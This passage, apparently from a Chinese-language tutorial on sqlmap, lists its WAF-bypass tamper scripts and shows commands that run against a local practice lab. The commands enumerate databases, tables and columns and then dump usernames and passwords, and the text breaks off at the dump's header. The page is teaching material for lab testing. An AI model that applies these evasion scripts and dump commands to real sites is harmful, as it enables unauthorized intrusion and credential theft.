&lt;td>&amp;ndash;os-bof&lt;/td>
&lt;td>储存过程缓冲区溢出利用&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;os-esc&lt;/td>
&lt;td>数据库进程用户权限提升&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ndash;msf-path=&lt;/td>
&lt;td>Metasploit Framework本地安装路径&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="二waf-绕过">二、WAF 绕过
&lt;/h2>&lt;blockquote>
&lt;p>WAF，即Web Application Firewall，即Web应用防火墙，是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。&lt;/p>
&lt;/blockquote>
&lt;p>我们可以使用&lt;code>--identify-waf&lt;/code>参数对一些网站是否有安全防护进行试探。当确定网站存在 WAF 之后我们需要对其进行绕过。&lt;/p>
&lt;p>在 sqlmap 下的 tamper 目录中存放着绕过 WAF 脚本。通过 &lt;code>--tamper&lt;/code> 参数使用脚本，多个 tamper 脚本之间用空格隔开。&lt;/p>
&lt;h3 id="1-自带-tamper">1. 自带 tamper
&lt;/h3>&lt;p>在 Kali 2020 的系统中，tamper 文件夹位置为：&lt;code>/usr/share/sqlmap/tamper&lt;/code>。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>适用数据库&lt;/th>
&lt;th>模块&lt;/th>
&lt;th>功能&lt;/th>
&lt;th>环境&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>ALL&lt;/td>
&lt;td>apostrophemask.py&lt;/td>
&lt;td>对单引号&lt;code>'&lt;/code>用URL-UTF8编码&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ALL&lt;/td>
&lt;td>apostrophenullencode.py&lt;/td>
&lt;td>对单引号&lt;code>'&lt;/code>用非法的双UNICODE编码&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ALL&lt;/td>
&lt;td>unmagicquotes.py&lt;/td>
&lt;td>将单引号&lt;code>'&lt;/code>替换成多个字节 并在结尾处添加注释符&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ALL&lt;/td>
&lt;td>escapequotes.py&lt;/td>
&lt;td>斜杠转义单引号&lt;code>'&lt;/code>和双引号&lt;code>&amp;quot;&lt;/code>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ALL&lt;/td>
&lt;td>base64encode.py&lt;/td>
&lt;td>对payload进行一次BASE64编码&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* Microsoft SQL Server 2000 * Microsoft SQL Server 2005 * MySQL 5.1.56 * PostgreSQL 9.0.3&lt;/td>
&lt;td>charunicodeencode.py&lt;/td>
&lt;td>对payload进行一次URL-UNICODE编码&lt;/td>
&lt;td>* ASP * ASP.NET&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ALL&lt;/td>
&lt;td>charunicodeescape.py&lt;/td>
&lt;td>对payload进行UNICODE格式转义编码&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ALL&lt;/td>
&lt;td>htmlencode.py&lt;/td>
&lt;td>对payload中非字母非数字字符进行HTML编码&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0&lt;/td>
&lt;td>charencode.py&lt;/td>
&lt;td>对payload进行一次URL编码&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ALL&lt;/td>
&lt;td>chardoubleencode.py&lt;/td>
&lt;td>对payload进行两次URL编码&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ALL&lt;/td>
&lt;td>overlongutf8.py&lt;/td>
&lt;td>将payload中非字母非数字字符用超长UTF8编码&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ALL&lt;/td>
&lt;td>overlongutf8more.py&lt;/td>
&lt;td>将payload中所有字符用超长UTF8编码&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5&lt;/td>
&lt;td>equaltolike.py&lt;/td>
&lt;td>将payload中所有&lt;code>=&lt;/code>替换成&lt;code>LIKE&lt;/code>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* MySQL 4, 5.0 and 5.5&lt;/td>
&lt;td>equaltorlike.py&lt;/td>
&lt;td>将payload中所有&lt;code>=&lt;/code>替换成&lt;code>RLIKE&lt;/code>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* MySQL 5.1, SGOS&lt;/td>
&lt;td>bluecoat.py&lt;/td>
&lt;td>将SQL语句中空格字符&lt;code>' '&lt;/code>替换为&lt;code>%09&lt;/code> 并替换&lt;code>=&lt;/code>为&lt;code>LIKE&lt;/code>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* MSSQL * SQLite&lt;/td>
&lt;td>space2dash.py&lt;/td>
&lt;td>将空格字符&lt;code>' '&lt;/code>替换成：&lt;code>--&lt;/code>+随机字符串+&lt;code>\n&lt;/code>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* MySQL&lt;/td>
&lt;td>space2hash.py&lt;/td>
&lt;td>将MySQL payload中空格字符&lt;code>' '&lt;/code>替换成： &lt;code>#&lt;/code>+随机字符串+&lt;code>\n&lt;/code>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* MySQL &amp;gt;= 5.1.13&lt;/td>
&lt;td>space2morehash.py&lt;/td>
&lt;td>将MySQL payload中空格字符&lt;code>' '&lt;/code>替换成： &lt;code>#&lt;/code>+随机字符串+&lt;code>\n&lt;/code>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* Microsoft SQL Server&lt;/td>
&lt;td>space2mssqlblank.py&lt;/td>
&lt;td>将MsSQL payload中空格字符&lt;code>' '&lt;/code>替换成 随机的空字符：(&lt;code>%01&lt;/code>, &lt;code>%02&lt;/code>, &lt;code>%03&lt;/code>, &lt;code>%04&lt;/code>···&lt;code>%0F&lt;/code>)&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* MSSQL * MySQL&lt;/td>
&lt;td>space2mssqlhash.py&lt;/td>
&lt;td>将MySQL payload中空格字符&lt;code>' '&lt;/code>替换成：&lt;code>#&lt;/code>+&lt;code>\n&lt;/code>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* MySQL&lt;/td>
&lt;td>space2mysqlblank.py&lt;/td>
&lt;td>将MySQL payload中空格字符&lt;code>' '&lt;/code>替换成 随机的空字符：(&lt;code>%09&lt;/code>, &lt;code>%0A&lt;/code>, &lt;code>%0B&lt;/code>, &lt;code>%0C&lt;/code>, &lt;code>%0D&lt;/code>)&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* MySQL * MSSQL&lt;/td>
&lt;td>space2mysqldash.py&lt;/td>
&lt;td>将MySQL payload中空格字符&lt;code>' '&lt;/code>替换成：&lt;code>--&lt;/code>+&lt;code>\n&lt;/code>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ALL&lt;/td>
&lt;td>space2plus.py&lt;/td>
&lt;td>将空格字符&lt;code>' '&lt;/code>替换成&lt;code>+&lt;/code>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0&lt;/td>
&lt;td>space2randomblank.py&lt;/td>
&lt;td>将空格字符&lt;code>' '&lt;/code>替换成随机的空字符： (&lt;code>%09&lt;/code>, &lt;code>%0A&lt;/code>, &lt;code>%0C&lt;/code>, &lt;code>%0D&lt;/code>)&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* MySQL * MsSQL&lt;/td>
&lt;td>0eunion.py&lt;/td>
&lt;td>&lt;code>UNION&lt;/code>语句替换&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ALL&lt;/td>
&lt;td>unionalltounion.py&lt;/td>
&lt;td>&lt;code>UNION&lt;/code>语句替换&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* MySQL&lt;/td>
&lt;td>misunion.py&lt;/td>
&lt;td>&lt;code>UNION&lt;/code>语句替换&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* Oracle&lt;/td>
&lt;td>dunion.py&lt;/td>
&lt;td>&lt;code>UNION&lt;/code>语句替换&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* MySQL&lt;/td>
&lt;td>sleep2getlock.py&lt;/td>
&lt;td>&lt;code>SLEEP&lt;/code>语句替换&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* MySQL * SQLite (possibly) * SAP MaxDB (possibly)&lt;/td>
&lt;td>ifnull2casewhenisnull.py&lt;/td>
&lt;td>&lt;code>IFNULL&lt;/code>语句替换&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* MySQL * SQLite (possibly) * SAP MaxDB (possibly)&lt;/td>
&lt;td>ifnull2ifisnull.py&lt;/td>
&lt;td>&lt;code>IFNULL&lt;/code>语句替换&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* MySQL&lt;/td>
&lt;td>commalesslimit.py&lt;/td>
&lt;td>MySQL payload中&lt;code>LIMIT&lt;/code>语句替换&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* MySQL&lt;/td>
&lt;td>commalessmid.py&lt;/td>
&lt;td>MySQL payload中&lt;code>MID&lt;/code>语句替换&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* MySQL&lt;/td>
&lt;td>hex2char.py&lt;/td>
&lt;td>MySQL payload中&lt;code>CONCAT(CHAR(),…)&lt;/code>语句替换&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0&lt;/td>
&lt;td>between.py&lt;/td>
&lt;td>用&lt;code>BETWEEN&lt;/code>语句替换&lt;code>=&amp;lt;&amp;gt;&lt;/code>号&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* MySQL&lt;/td>
&lt;td>concat2concatws.py&lt;/td>
&lt;td>MySQL payload中&lt;code>CONCAT&lt;/code>语句替换&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0&lt;/td>
&lt;td>space2comment.py&lt;/td>
&lt;td>将空格字符&lt;code>' '&lt;/code>替换成注释符&lt;code>/**/&lt;/code>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* MySQL 5.0 and 5.5&lt;/td>
&lt;td>space2morecomment.py&lt;/td>
&lt;td>将MySQL payload中空格字符&lt;code>' '&lt;/code>替换成 注释符&lt;code>/**_**/&lt;/code>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* Microsoft SQL Server * MySQL * Oracle * PostgreSQL&lt;/td>
&lt;td>commentbeforeparentheses.py&lt;/td>
&lt;td>在括号前加上&lt;code>/**/&lt;/code>注释&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* MySQL &amp;lt; 5.1&lt;/td>
&lt;td>halfversionedmorekeywords.py&lt;/td>
&lt;td>在关键字前添加MySQL版本注释信息&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* MySQL&lt;/td>
&lt;td>modsecurityversioned.py&lt;/td>
&lt;td>用注释来包围完整的MySQL查询语句&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* MySQL&lt;/td>
&lt;td>modsecurityzeroversioned.py&lt;/td>
&lt;td>用注释来包围完整的MySQL查询语句&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ALL&lt;/td>
&lt;td>randomcomments.py&lt;/td>
&lt;td>在SQL关键字的字符之间随机添加注释符&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* MySQL&lt;/td>
&lt;td>versionedkeywords.py&lt;/td>
&lt;td>对MySQL payload中非函数的关键字进行注释&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* MySQL &amp;gt;= 5.1.13&lt;/td>
&lt;td>versionedmorekeywords.py&lt;/td>
&lt;td>对MySQL payload中所有关键字进行注释&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* Microsoft Access&lt;/td>
&lt;td>appendnullbyte.py&lt;/td>
&lt;td>在payload结束位置加零字节字符&lt;code>%00&lt;/code>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* MySQL&lt;/td>
&lt;td>binary.py&lt;/td>
&lt;td>在payload可能位置插入关键字&lt;code>binary&lt;/code>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0&lt;/td>
&lt;td>greatest.py&lt;/td>
&lt;td>&lt;code>&amp;gt;&lt;/code>替换成&lt;code>GREATEST&lt;/code>语句&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0&lt;/td>
&lt;td>least.py&lt;/td>
&lt;td>&lt;code>&amp;gt;&lt;/code>替换成&lt;code>LEAST&lt;/code>语句&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ALL&lt;/td>
&lt;td>informationschemacomment.py&lt;/td>
&lt;td>在&amp;quot;information_schema&amp;quot;后面加上&lt;code>/**/&lt;/code>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0&lt;/td>
&lt;td>lowercase.py&lt;/td>
&lt;td>将所有大写字符替换成小写字符&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0&lt;/td>
&lt;td>uppercase.py&lt;/td>
&lt;td>将所有小写字符替换成大写字符&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ALL&lt;/td>
&lt;td>multiplespaces.py&lt;/td>
&lt;td>在SQL关键字旁添加多个空格符&lt;code>' '&lt;/code>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* Microsoft SQL Server 2000, 2005 * MySQL 5.1.56, 5.5.11 * PostgreSQL 9.0&lt;/td>
&lt;td>percentage.py&lt;/td>
&lt;td>payload中每个字符前加&lt;code>%&lt;/code>&lt;/td>
&lt;td>* ASP&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* Microsoft SQL Server 2012+&lt;/td>
&lt;td>plus2concat.py&lt;/td>
&lt;td>将&lt;code>+&lt;/code>替换成MsSQL的&lt;code>CONCAT()&lt;/code>语句&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* Microsoft SQL Server 2008+&lt;/td>
&lt;td>plus2fnconcat.py&lt;/td>
&lt;td>将&lt;code>+&lt;/code>替换成MsSQL的&lt;code>{fn CONCAT()}&lt;/code>语句&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0 * SQLite 3&lt;/td>
&lt;td>randomcase.py&lt;/td>
&lt;td>对每个SQL关键字的字符替换成随机大小写&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* MySQL&lt;/td>
&lt;td>schemasplit.py&lt;/td>
&lt;td>拆分数据库标识符&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* MSSQL&lt;/td>
&lt;td>sp_password.py&lt;/td>
&lt;td>在MsSQL payload后添加&lt;code>ssp_password&lt;/code> 用于混淆数据库日志&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>* PostgreSQL 9.6.12&lt;/td>
&lt;td>substring2leftright.py&lt;/td>
&lt;td>将PostgreSQL中&lt;code>SUBSTRING&lt;/code>语句 用&lt;code>LEFT&lt;/code>和&lt;code>RIGHT&lt;/code>代替&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ALL&lt;/td>
&lt;td>symboliclogical.py&lt;/td>
&lt;td>将&lt;code>AND&lt;/code>和&lt;code>OR&lt;/code>替换成&lt;code>&amp;amp;&amp;amp;&lt;/code>和`&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ALL&lt;/td>
&lt;td>luanginx.py&lt;/td>
&lt;td>针对LUA-Nginx WAF进行绕过&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ALL&lt;/td>
&lt;td>varnish.py&lt;/td>
&lt;td>添加一个HTTP头&lt;code>X-originating-IP&lt;/code> 用来绕过Varnish防火墙&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ALL&lt;/td>
&lt;td>xforwardedfor.py&lt;/td>
&lt;td>添加伪造的HTTP头&lt;code>X-Forwarded-For&lt;/code>&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="三使用小技巧">三、使用小技巧
&lt;/h2>&lt;ul>
&lt;li>
&lt;ol>
&lt;li>注入的请求必须是正确的请求，例如测试登录时必须要使用能够正常登录的账号密码；&lt;/li>
&lt;li>当我们知道哪里存在注入点时，我们可以在注入点加上 * 来标识这是一个注入点；&lt;/li>
&lt;/ol>
&lt;h2 id="四sqlmap-使用示例">四、sqlmap 使用示例
&lt;/h2>&lt;h3 id="1-获取所有数据库">1. 获取所有数据库
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">Input:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sqlmap -u &lt;span class="s2">&amp;#34;http://192.168.1.200:9080/Less-1/?id=1&amp;#34;&lt;/span> --batch --dbs
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Output:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ailable databases &lt;span class="o">[&lt;/span>5&lt;span class="o">]&lt;/span>:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> challenges
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> information_schema
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> mysql
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> performance_schema
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> security
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>参数解读：&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>&lt;strong>-u&lt;/strong>：指定测试的 url&lt;/li>
&lt;li>&lt;strong>&amp;ndash;batch&lt;/strong>：使用所有默认选项&lt;/li>
&lt;li>&lt;strong>&amp;ndash;dbs&lt;/strong>：获取所有数据库&lt;/li>
&lt;/ul>
&lt;h3 id="2-获取指定数据库的所有表">2. 获取指定数据库的所有表
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">Input:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sqlmap -u &lt;span class="s2">&amp;#34;http://192.168.1.200:9080/Less-1/?id=1&amp;#34;&lt;/span> --batch -D security --tables
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Output:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Database: security
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>&lt;span class="m">4&lt;/span> tables&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+----------+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> emails &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> referers &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> uagents &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> users &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+----------+
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="3-获取指定表的所有列名">3. 获取指定表的所有列名
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">Input:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sqlmap -u &lt;span class="s2">&amp;#34;http://192.168.1.200:9080/Less-1/?id=1&amp;#34;&lt;/span> --batch -D security -T users --columns
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Output:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Database: security Table: users
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>&lt;span class="m">3&lt;/span> columns&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+----------+-------------+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Column &lt;span class="p">|&lt;/span> Type &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+----------+-------------+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> id &lt;span class="p">|&lt;/span> int&lt;span class="o">(&lt;/span>3&lt;span class="o">)&lt;/span> &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> password &lt;span class="p">|&lt;/span> varchar&lt;span class="o">(&lt;/span>20&lt;span class="o">)&lt;/span> &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> username &lt;span class="p">|&lt;/span> varchar&lt;span class="o">(&lt;/span>20&lt;span class="o">)&lt;/span> &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+----------+-------------+
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="4-获取指定列的值">4. 获取指定列的值
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">Input:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sqlmap -u &lt;span class="s2">&amp;#34;http://192.168.1.200:9080/Less-1/?id=1&amp;#34;&lt;/span> --batch -D security -T users -C &lt;span class="s2">&amp;#34;username,password&amp;#34;&lt;/span> --dump
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Output:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Database: security Table: users
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>&lt;span class="m">14&lt;/span> entries&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+----------+----------+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> username &lt;span class="p">|&lt;/span> password &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+----------+----------+
